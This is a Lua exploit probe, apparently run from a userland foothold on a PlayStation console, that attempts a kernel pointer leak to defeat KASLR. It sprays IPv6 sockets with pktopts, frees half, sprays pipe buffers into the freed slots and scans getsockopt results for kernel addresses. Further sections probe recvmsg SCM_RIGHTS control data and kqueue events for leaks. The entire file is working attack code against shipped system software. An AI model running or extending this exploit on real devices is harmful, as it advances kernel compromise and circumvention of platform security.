-- CRASH_CLASS: MODERATE
-- PROBE 143q: IPv6 pktopts + pipe buffer kernel pointer leak
--
-- Context: 143p proved IPV6_2292PKTINFO(19) works on 14.10.
-- Classic PS4/PS5 exploit: set pktopts on socket → free it → spray pipe
-- buffers into freed slot → read residual kernel data from pipe.
-- This probe attempts the initial KASLR defeat via pktopts UAF read.

print("=== PROBE 143q: IPV6 PIPE KPTR LEAK ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

local pid = to_num(syscall.getpid())
print("[*] pid=" .. pid)
print("[*] eboot=" .. hex(eboot_base))

--------------------------------------------------------------------
-- [A] Create pipe pair
--------------------------------------------------------------------
print("")
print("--- [A] Pipe ---")

local pipefds = memory.alloc(16)
local rv_pipe = syscall.pipe(uint64(pipefds))
local pipe_ret = to_num(rv_pipe)
print("[A] pipe() ret=" .. pipe_ret)

if pipe_ret ~= 0 then
    print("[A] pipe FAILED — trying fcall fallback")
    local pipe_fn = fcall(syscall.syscall_address, 42)
    local ok, rv = pcall(function() return pipe_fn(uint64(pipefds)) end)
    pipe_ret = ok and to_num(rv) or -1
    print("[A] fcall pipe ret=" .. pipe_ret)
end

local pipe_rd = to_num(memory.read_dword(pipefds))
local pipe_wr = to_num(memory.read_dword(pipefds + 4))
print("[A] pipe fds: read=" .. pipe_rd .. " write=" .. pipe_wr)

if pipe_ret ~= 0 or pipe_rd <= 0 then
    print("[A] No pipe available")
    print("=== PROBE 143q COMPLETE ===")
    return
end

--------------------------------------------------------------------
-- [B] Create many IPv6 sockets with pktopts
-- Spray pktopts allocations to fill slab
--------------------------------------------------------------------
print("")
print("--- [B] IPv6 socket spray ---")

local NUM_SPRAY = 50
local sockets = {}
local optval = memory.alloc(64)

for i = 1, NUM_SPRAY do
    local ok, fd = pcall(function()
        return syscall.socket(uint64(28), uint64(2), uint64(0))
    end)
    if ok then
        local fd_num = to_num(fd)
        if fd_num >= 0 then
            -- Set IPV6_2292PKTINFO to allocate pktopts
            memory.write_dword(optval, 1)
            local ok_s, rv_s = pcall(function()
                return syscall.setsockopt(uint64(fd_num), uint64(41), uint64(19), uint64(optval), uint64(4))
            end)
            if ok_s and to_num(rv_s) == 0 then
                table.insert(sockets, fd_num)
            else
                syscall.close(uint64(fd_num))
            end
        end
    end
end

print("[B] Created " .. #sockets .. " sockets with pktopts")

if #sockets < 10 then
    print("[B] Not enough sockets")
    for _, fd in ipairs(sockets) do syscall.close(uint64(fd)) end
    syscall.close(uint64(pipe_rd))
    syscall.close(uint64(pipe_wr))
    print("=== PROBE 143q COMPLETE ===")
    return
end

--------------------------------------------------------------------
-- [C] Close half the sockets to free pktopts (create holes)
--------------------------------------------------------------------
print("")
print("--- [C] Free pktopts (close sockets) ---")

local freed_count = 0
local kept = {}
for i = 1, #sockets do
    if i % 2 == 0 then
        -- Close every other socket to create holes
        syscall.close(uint64(sockets[i]))
        freed_count = freed_count + 1
    else
        table.insert(kept, sockets[i])
    end
end
print("[C] Freed " .. freed_count .. " sockets, kept " .. #kept)

--------------------------------------------------------------------
-- [D] Spray pipe buffers into freed pktopts slots
--------------------------------------------------------------------
print("")
print("--- [D] Pipe buffer spray ---")

local NUM_PIPES = 40
local pipes = {}

for i = 1, NUM_PIPES do
    local pfd = memory.alloc(16)
    local ok, rv = pcall(function()
        return syscall.pipe(uint64(pfd))
    end)
    if ok and to_num(rv) == 0 then
        local rd = to_num(memory.read_dword(pfd))
        local wr = to_num(memory.read_dword(pfd + 4))
        if rd > 0 then
            table.insert(pipes, {rd=rd, wr=wr})
        end
    end
end
print("[D] Created " .. #pipes .. " pipes")

--------------------------------------------------------------------
-- [E] Read pipe buffers for residual kernel data
-- When pipe buffer overlaps freed pktopts, residual pointers leak
--------------------------------------------------------------------
print("")
print("--- [E] Residual data scan ---")

-- Try to read from pipe buffers — they should be empty
-- BUT: if the kernel didn't zero the buffer, residual data might be there
-- Actually, pipes only return data that was written. Need different approach.

-- Alternative: write a MARKER to pipe, then use getsockopt on kept sockets
-- to see if the overlap happened (getsockopt reads from pktopts area)

-- Method 2: use getsockopt(IPV6_2292PKTOPTIONS, 25) to dump pktopts raw
-- If the pktopts was freed and reused by pipe buffer, reading it leaks pipe data
-- But we need option 25 to work...

-- Method 3: Use the KEPT sockets' getsockopt for individual options
-- If a kept socket's pktopts neighbor was freed and reused, the kept
-- socket's pointers might point into reused memory

-- Actually, the correct approach: read from the KEPT sockets that still
-- have pktopts. Their pktopts might overlap with freed pipe buffers
-- from the FREED sockets' slot reuse.

-- Check IPV6_2292PKTOPTIONS (option 25) - reads raw pktopts struct
local optbuf = memory.alloc(0x400)
local optlenp = memory.alloc(8)

local kptr_found = 0
for idx, fd in ipairs(kept) do
    -- Clear buffer
    for off = 0, 0x3FC, 4 do memory.write_dword(optbuf + off, 0) end
    memory.write_qword(optlenp, uint64(0x400))

    local ok, rv = pcall(function()
        return syscall.getsockopt(uint64(fd), uint64(41), uint64(25), uint64(optbuf), uint64(optlenp))
    end)

    if ok and to_num(rv) == 0 then
        local gotlen = to_num(memory.read_qword(optlenp))
        if idx <= 3 then
            print("[E] fd=" .. fd .. " IPV6_2292PKTOPTIONS len=" .. gotlen)
        end

        -- Scan for kernel pointers
        for off = 0, math.min(gotlen - 8, 0x3F8), 8 do
            local q = memory.read_qword(optbuf + off)
            if q then
                local h, l = get_hi_lo(q)
                if h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then
                    kptr_found = kptr_found + 1
                    if kptr_found <= 10 then
                        print("[E] !!! KPTR fd=" .. fd .. " opt25 +" .. string.format("%X", off) .. "=" .. hex(q))
                    end
                end
            end
        end
    elseif idx <= 3 then
        print("[E] fd=" .. fd .. " opt25 ret=" .. tostring(rv))
    end

    -- Also try individual 2292 options
    for _, optnum in ipairs({19, 20, 24}) do
        for off = 0, 0xFF, 4 do memory.write_dword(optbuf + off, 0) end
        memory.write_qword(optlenp, uint64(0x100))

        local ok2, rv2 = pcall(function()
            return syscall.getsockopt(uint64(fd), uint64(41), uint64(optnum), uint64(optbuf), uint64(optlenp))
        end)

        if ok2 and to_num(rv2) == 0 then
            local gotlen2 = to_num(memory.read_qword(optlenp))
            for off = 0, math.min(gotlen2 - 8, 0xF8), 8 do
                local q = memory.read_qword(optbuf + off)
                if q then
                    local h, l = get_hi_lo(q)
                    if h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then
                        kptr_found = kptr_found + 1
                        if kptr_found <= 10 then
                            print("[E] !!! KPTR fd=" .. fd .. " opt" .. optnum .. " +" .. string.format("%X", off) .. "=" .. hex(q))
                        end
                    end
                end
            end
        end
    end
end

print("[E] Total kernel pointers found: " .. kptr_found)

--------------------------------------------------------------------
-- [F] Try recvmsg with cmsg for kernel data leak
-- sendmsg/recvmsg path might leak kernel addresses in ancillary data
--------------------------------------------------------------------
print("")
print("--- [F] recvmsg cmsg leak ---")

-- Create a Unix domain socketpair for SCM_RIGHTS test
local spfds = memory.alloc(16)
local rv_sp = syscall.socketpair(uint64(1), uint64(1), uint64(0), uint64(spfds))
local sp_ret = to_num(rv_sp)

if sp_ret == 0 then
    local sp0 = to_num(memory.read_dword(spfds))
    local sp1 = to_num(memory.read_dword(spfds + 4))
    print("[F] socketpair fds: " .. sp0 .. ", " .. sp1)

    -- Send SCM_RIGHTS (pass a file descriptor through the socket)
    -- This exercises the kernel's fd passing code
    -- msghdr struct layout:
    --   msg_name: ptr (8)
    --   msg_namelen: int (4) + pad (4)
    --   msg_iov: ptr (8)
    --   msg_iovlen: int (4) + pad (4)
    --   msg_control: ptr (8)
    --   msg_controllen: socklen_t (4) + pad (4)
    --   msg_flags: int (4)

    local msghdr = memory.alloc(0x100)
    local iov = memory.alloc(0x20)
    local cmsg_buf = memory.alloc(0x100)
    local data_buf = memory.alloc(0x20)

    -- Data to send
    memory.write_dword(data_buf, 0x41424344)  -- "ABCD"

    -- iovec
    memory.write_qword(iov, uint64(data_buf))      -- iov_base
    memory.write_qword(iov + 8, uint64(4))          -- iov_len

    -- cmsg header for SCM_RIGHTS
    -- cmsg_len = CMSG_LEN(sizeof(int)) = 16 + 4 = 20 on 64-bit
    -- Actually CMSG_LEN = sizeof(struct cmsghdr) + datalen = 12 + 4 = 16 on FreeBSD
    -- struct cmsghdr { socklen_t cmsg_len; int cmsg_level; int cmsg_type; }
    memory.write_dword(cmsg_buf, 16)      -- cmsg_len (header + 1 int fd)
    memory.write_dword(cmsg_buf + 4, 0xFFFF)  -- cmsg_level = SOL_SOCKET
    memory.write_dword(cmsg_buf + 8, 1)    -- cmsg_type = SCM_RIGHTS
    memory.write_dword(cmsg_buf + 12, pipe_rd)  -- the fd to pass

    -- msghdr
    memory.write_qword(msghdr, uint64(0))          -- msg_name = NULL
    memory.write_dword(msghdr + 8, 0)               -- msg_namelen
    memory.write_qword(msghdr + 16, uint64(iov))    -- msg_iov
    memory.write_dword(msghdr + 24, 1)               -- msg_iovlen = 1
    memory.write_qword(msghdr + 32, uint64(cmsg_buf))  -- msg_control
    memory.write_dword(msghdr + 40, 16)              -- msg_controllen
    memory.write_dword(msghdr + 48, 0)               -- msg_flags

    -- sendmsg(sp0, msghdr, 0)
    local sendmsg_fn = fcall(syscall.syscall_address, 28)
    local ok_sm, rv_sm = pcall(function()
        return sendmsg_fn(uint64(sp0), uint64(msghdr), uint64(0))
    end)
    print("[F] sendmsg ret=" .. tostring(rv_sm))

    -- recvmsg with large cmsg buffer — check for leaked kernel data
    local recv_cmsg = memory.alloc(0x200)
    local recv_data = memory.alloc(0x100)
    local recv_iov = memory.alloc(0x20)
    local recv_hdr = memory.alloc(0x100)

    -- Fill cmsg with sentinel
    for off = 0, 0x1FC, 4 do memory.write_dword(recv_cmsg + off, 0xDDDDDDDD) end

    memory.write_qword(recv_iov, uint64(recv_data))
    memory.write_qword(recv_iov + 8, uint64(0x100))

    memory.write_qword(recv_hdr, uint64(0))            -- msg_name
    memory.write_dword(recv_hdr + 8, 0)                 -- msg_namelen
    memory.write_qword(recv_hdr + 16, uint64(recv_iov)) -- msg_iov
    memory.write_dword(recv_hdr + 24, 1)                 -- msg_iovlen
    memory.write_qword(recv_hdr + 32, uint64(recv_cmsg)) -- msg_control
    memory.write_dword(recv_hdr + 40, 0x200)             -- msg_controllen (large)
    memory.write_dword(recv_hdr + 48, 0)                 -- msg_flags

    local recvmsg_fn = fcall(syscall.syscall_address, 27)
    local ok_rm, rv_rm = pcall(function()
        return recvmsg_fn(uint64(sp1), uint64(recv_hdr), uint64(0))
    end)
    print("[F] recvmsg ret=" .. tostring(rv_rm))

    if ok_rm and to_num(rv_rm) >= 0 then
        -- Check cmsg for kernel data
        local clen = to_num(memory.read_dword(recv_hdr + 40))
        print("[F] controllen after recv=" .. clen)

        -- Scan received cmsg for kernel pointers
        for off = 0, math.min(clen, 0x1F8), 8 do
            local q = memory.read_qword(recv_cmsg + off)
            if q then
                local h, l = get_hi_lo(q)
                if h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then
                    print("[F] !!! KPTR in cmsg +" .. string.format("%X", off) .. "=" .. hex(q))
                end
                -- Also print non-sentinel non-zero values
                if off < 32 and (h ~= 0 or l ~= 0) and l ~= 0xDDDDDDDD then
                    print("[F] cmsg +" .. string.format("%X", off) .. "=" .. hex(q))
                end
            end
        end
    end

    syscall.close(uint64(sp0))
    syscall.close(uint64(sp1))
end

--------------------------------------------------------------------
-- [G] kqueue + EVFILT_PROC
--------------------------------------------------------------------
print("")
print("--- [G] kqueue EVFILT_PROC ---")

-- Create kqueue
local kqueue_fn = fcall(syscall.syscall_address, 362)
local ok_kq, kq_fd = pcall(function() return kqueue_fn() end)

if ok_kq then
    local kq_num = to_num(kq_fd)
    print("[G] kqueue fd=" .. kq_num)

    if kq_num >= 0 then
        -- kevent struct (FreeBSD):
        -- ident: uintptr_t (8)
        -- filter: short (2)
        -- flags: u_short (2)
        -- fflags: u_int (4)
        -- data: intptr_t (8)
        -- udata: void* (8)
        -- Total: 32 bytes

        local changelist = memory.alloc(0x100)
        local eventlist = memory.alloc(0x200)

        -- Add EVFILT_PROC for our own PID
        -- EVFILT_PROC = -5, EV_ADD = 1, NOTE_EXIT = 0x80000000
        memory.write_qword(changelist, uint64(pid))           -- ident = our PID
        memory.write_dword(changelist + 8, 0x0001FFFB)        -- filter=-5 (EVFILT_PROC) + flags=EV_ADD(1)
        memory.write_dword(changelist + 12, 0x80000000)       -- fflags = NOTE_EXIT
        memory.write_qword(changelist + 16, uint64(0))        -- data
        memory.write_qword(changelist + 24, uint64(0x4142434445464748))  -- udata marker

        -- kevent(kq, changelist, nchanges, eventlist, nevents, timeout)
        -- Use old kevent (363) which works
        local kevent_fn = fcall(syscall.syscall_address, 363)

        -- Zero timeout struct
        local ts = memory.alloc(16)
        memory.write_qword(ts, uint64(0))
        memory.write_qword(ts + 8, uint64(0))

        -- Register and poll
        for off = 0, 0x1FC, 4 do memory.write_dword(eventlist + off, 0xEEEEEEEE) end

        local ok_ke, rv_ke = pcall(function()
            return kevent_fn(uint64(kq_num), uint64(changelist), uint64(1), uint64(eventlist), uint64(4), uint64(ts))
        end)

        if ok_ke then
            local nevents = to_num(rv_ke)
            print("[G] kevent ret=" .. nevents)

            -- Scan returned events for kernel data
            for ev = 0, math.min(nevents - 1, 3) do
                local base = eventlist + ev * 32
                print("[G] event " .. ev .. ":")
                print("[G]   ident=" .. hex(memory.read_qword(base)))
                print("[G]   filter+flags=" .. hex(memory.read_dword(base + 8)))
                print("[G]   fflags=" .. hex(memory.read_dword(base + 12)))
                print("[G]   data=" .. hex(memory.read_qword(base + 16)))
                print("[G]   udata=" .. hex(memory.read_qword(base + 24)))

                -- Check all qwords for kernel pointers
                for off = 0, 24, 8 do
                    local q = memory.read_qword(base + off)
                    if q then
                        local h, l = get_hi_lo(q)
                        if h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then
                            print("[G] !!! KPTR in kevent +" .. off .. "=" .. hex(q))
                        end
                    end
                end
            end

            -- Also check uninitialized eventlist area beyond returned events
            for off = nevents * 32, math.min(nevents * 32 + 64, 0x1F8), 8 do
                local q = memory.read_qword(eventlist + off)
                if q then
                    local h, l = get_hi_lo(q)
                    if h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then
                        print("[G] !!! KPTR in uninitialized kevent +" .. off .. "=" .. hex(q))
                    end
                end
            end
        else
            print("[G] kevent FAIL: " .. tostring(rv_ke))
        end

        syscall.close(uint64(kq_num))
    end
else
    print("[G] kqueue FAIL: " .. tostring(kq_fd))
end

--------------------------------------------------------------------
-- Cleanup
--------------------------------------------------------------------
print("")
for _, fd in ipairs(kept) do
    pcall(function() syscall.close(uint64(fd)) end)
end
for _, p in ipairs(pipes) do
    pcall(function() syscall.close(uint64(p.rd)) end)
    pcall(function() syscall.close(uint64(p.wr)) end)
end
syscall.close(uint64(pipe_rd))
syscall.close(uint64(pipe_wr))

print("=== PROBE 143q COMPLETE ===")
